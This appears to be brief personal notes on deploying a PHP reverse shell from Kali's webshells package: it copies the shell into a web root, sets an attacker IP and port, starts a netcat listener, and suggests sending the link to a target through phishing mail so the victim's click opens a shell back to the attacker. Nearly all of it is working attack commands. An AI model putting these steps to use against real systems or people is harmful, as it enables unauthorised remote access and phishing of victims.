# Install WebShells:
```
sudo apt install webshells
```

#### List:
```
ls /usr/share/webshells
```

Output:
```
asp  aspx  cfm  jsp  perl  php
```

Copy PHP webshell to root shell on local server to test:
```
cp /usr/share/webshells/php/php-reverse-shell.php /var/www/html/rvs.php
```

Modify the listening ports:
You can send the link to your target to click on (e.g.: phishing mail)
```
vi /var/www/html/rvs.php
```

Change:
```
$ip = <ServerIPthatListensForConnection> # e.g.: you kali box
$port = <portToListen>
```

Start listenr
```
nc -nlvp 1234
```

Once user click on link, reverse shell of the server will open.